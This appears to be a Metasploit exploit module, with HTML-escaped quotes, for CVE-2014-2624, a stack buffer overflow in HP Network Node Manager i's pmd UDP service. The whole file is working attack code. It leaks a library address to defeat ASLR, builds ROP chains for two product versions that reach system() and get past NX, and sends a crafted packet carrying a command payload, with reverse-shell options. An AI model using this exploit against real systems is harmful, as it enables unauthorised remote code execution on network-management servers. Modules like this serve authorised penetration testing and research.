# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::Udp
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP Network Node Manager I PMD Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack buffer overflow in HP Network Node Manager I (NNMi). The
        vulnerability exists in the pmd service, due to the insecure usage of functions like
        strcpy and strcat while handling stack_option packets with user controlled data. In
        order to bypass ASLR this module uses a proto_tbl packet to leak an libov pointer from
        the stack and finally build the rop chain to avoid NX.
      },
      &#039;Author&#039;         =>
        [
          &#039;d(-_-)b&#039;,     # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-2624&#039;],
          [&#039;ZDI&#039;, &#039;14-305&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => "\x00",
          &#039;Space&#039;       => 3000,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
              &#039;RequiredCmd&#039; => &#039;generic python perl openssl bash-tcp gawk&#039;
            }
        },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}],
          [&#039;HP NNMi 9.10 / CentOS 5&#039;,
            {
              # ptr to .rodata with format specifier
              #.rodata:0003BE86 aS_1            db &#039;%s&#039;,0
              &#039;ov_offset&#039;      => 0x3BE86,
              :rop             => :rop_hp_nnmi_9_10
            }
          ],
          [&#039;HP NNMi 9.20 / CentOS 6&#039;,
            {
              # ptr to .rodata with format specifier
              #.rodata:0003C2D6 aS_1            db &#039;%s&#039;,0
              &#039;ov_offset&#039;      => 0x3c2d8,
              :rop             => :rop_hp_nnmi_9_20
            }
          ]
        ],
      &#039;Privileged&#039;     => false, # true for HP NNMi 9.10, false for HP NNMi 9.20
      &#039;DisclosureDate&#039; => &#039;Sep 09 2014&#039;,
      &#039;DefaultTarget&#039;  => 0
      ))
 
    register_options([ Opt::RPORT(7426) ], self.class)
  end
 
  def check
    header = [
      0x2a5,  # pmdmgr_init pkt
      0x3cc,  # signature
      0xa0c,  # signature
      0xca8   # signature
    ].pack("V")
 
    data = "\x00" * (0xfa4 - header.length)
 
    pkt = header + data
 
    connect_udp
    udp_sock.put(pkt)
    res = udp_sock.timed_read(8, 1)
    if res.blank?
      # To mitigate MacOSX udp sockets behavior
      # see https://dev.metasploit.com/redmine/issues/7480
      udp_sock.put(pkt)
      res = udp_sock.timed_read(8)
    end
    disconnect_udp
 
    if res.blank?
      return Exploit::CheckCode::Unknown
    elsif res.length == 8 && res.unpack("V").first == 0x2a5
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end
 
  def exploit
    connect_udp
    # info leak with a "proto_tbl" packet
    print_status("Sending a &#039;proto_tbl&#039; request...")
    udp_sock.put(proto_tbl_pkt)
 
    res = udp_sock.timed_read(13964, 1)
    if res.blank?
      # To mitigate MacOSX udp sockets behavior
      # see https://dev.metasploit.com/redmine/issues/7480
      udp_sock.put(proto_tbl_pkt)
      res = udp_sock.timed_read(13964)
    end
 
    if res.blank?
      fail_with(Failure::Unknown, "Unable to get a &#039;proto_tbl&#039; response...")
    end
 
    if target.name == &#039;Automatic&#039;
      print_status("Fingerprinting target...")
      my_target = auto_target(res)
      fail_with(Failure::NoTarget, "Unable to autodetect target...") if my_target.nil?
    else
      my_target = target
      fail_with(Failure::Unknown, "Unable to leak libov base address...") unless find_ov_base(my_target, res)
    end
 
    print_good("Exploiting #{my_target.name} with libov base address at 0x#{@ov_base.to_s(16)}...")
 
    # exploit with a "stack_option_pkt" packet
    udp_sock.put(stack_option_pkt(my_target, @ov_base))
 
    disconnect_udp
  end
 
  def rop_hp_nnmi_9_10(ov_base)
    rop = rand_text_alpha(775)
    rop << [0x808d7c1].pack("V")          # pop ebx ; pop ebp ; ret
    rop << [ov_base + 0x481A8].pack("V")  # ebx: libov .got
    rop << [0x8096540].pack("V")          # ptr to .data where user controlled string will be stored:
                                          # "PMD Stack option specified, but stack not available (user_controlled)"
    rop << [0x808d7c2].pack("V")          # pop ebp # ret
    rop << [0x08096540 + 4732].pack("V")  # ebp: ptr to our controlled data in .data (+0x1028 to compensate)
    rop << [ov_base +  0x1D692].pack("V") # ptr to &#039;call _system&#039; sequence:
                                          #.text:0001D692  lea     eax, [ebp+dest]
                                          #.text:0001D698  push    eax             ; command
                                          #.text:0001D699  call    _system
    rop
  end
 
  def rop_hp_nnmi_9_20(ov_base)
    rop = rand_text_alpha(775)
    rop << [0x808dd70].pack("V")                      # pop eax ; pop ebx ; pop ebp ; ret
    rop << [0xf7f61cd0 + ov_base + 0x1dae6].pack("V") # eax: ptr to &#039;call _system&#039; sequence
                                                      #.text:0001DAE6  lea     eax, [ebp+dest] (dest = -0x1028)
                                                      #.text:0001DAEC  push    eax             ; command
                                                      #.text:0001DAED  call    _system
    rop << [0x08097160].pack("V")                     # ebx: ptr to .data where user controlled string will be stored:
                                                      # "PMD Stack option specified, but stack not available (user_controlled)"
    rop << rand_text_alpha(4)                         # ebp: padding
    rop << [0x804fb86].pack("V")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)
    rop << [0x8049ac4].pack("V")                      # xchg eax, edi ; ret
    rop << [0x808dd70].pack("V")                      # pop eax ; pop ebx ; pop ebp ; ret
    rop << [0xf7f61cd0 + ov_base + 0x47f1c].pack("V") # eax: libov .got base
    rop << rand_text_alpha(4)                         # ebx: padding
    rop << [0x8097160 + 4764].pack("V")               # ebp: ptr to our controlled data in .data (+0x1028 to compensate)
    rop << [0x804fb86].pack("V")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)
    rop << [0x805a58d].pack("V")                      # xchg ebx eax ; and eax 0xc4830001 ; and cl cl ; ret (ebx: libov .got)
    rop << [0x8049ac4].pack("V")                      # xchg eax, edi ; ret ; (eax: call to system sequence from libov)
    rop << [0x80528BC].pack("V")                      # jmp eax
 
    rop
  end
 
  def stack_option_pkt(t, ov_base)
    hdr = [0x2a9].pack("V")             # stack_option packet
    data = "-SA"                        # stack name (invalid one &#039;A&#039;)
    data << ";"                         # separator
    data << self.send(t[:rop], ov_base) # malformed stack options
    data << payload.encoded
    data << ";\n"
    data << "\x00" * (0xfa4 - data.length - hdr.length)
 
    hdr + data
  end
 
  def proto_tbl_pkt
    hdr = [0x2aa].pack("V") # proto_tbl packet
    data = "\x00" * (0xfa4 - hdr.length)
 
    hdr + data
  end
 
  def base(address, offset)
    address - offset
  end
 
  def find_ov_base(t, data)
    print_status("Searching #{t.name} pointers...")
    i = 0
    data.unpack("V*").each do |int|
      if base(int, t[&#039;ov_offset&#039;]) % 0x1000 == 0
        print_status("Pointer 0x#{int.to_s(16)} found at offset #{i * 4}")
        @ov_base = base(int, t[&#039;ov_offset&#039;])
        return true
      end
      i = i + 1
    end
 
    false
  end
 
  def auto_target(data)
    targets.each do |t|
      next if t.name == &#039;Automatic&#039;
      if find_ov_base(t, data)
        return t
      end
    end
 
    nil
  end
 
end

